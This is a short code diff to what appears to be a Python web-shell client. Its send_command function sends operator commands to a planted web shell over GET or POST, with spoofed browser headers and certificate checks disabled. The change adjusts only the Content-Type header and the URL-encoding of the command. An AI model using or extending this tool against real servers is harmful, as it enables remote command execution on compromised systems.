@@ -18,11 +18,12 @@ def remove_html(text):
 
 def send_command(command, webshell, method, param="code"):
    headers = {"User-Agent":"Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
-   "Authorization":args.auth, "Cookie":args.cookies}
+   "Authorization":args.auth, "Cookie":args.cookies, "Content-Type":"application/x-www-form-urlencoded"}
    params = {param.strip():command.strip()}
    if args.noenc:
-      headers.update({"Content-Type":"application/x-www-form-urlencoded"})
-      params = urllib.parse.urlencode(params, safe='|!"#$%&/()=?,.-;:_[]{ }')
+      params = urllib.parse.urlencode(params, safe='|!"#$%&/()=?,.-;:_][]}{><')
+   else:
+      params = urllib.parse.urlencode(params, safe='')
    if (method.upper() == "GET"):
       response = requests.get((webshell), params=params, headers=headers, verify=False)
    elif (method.upper() == "POST"):
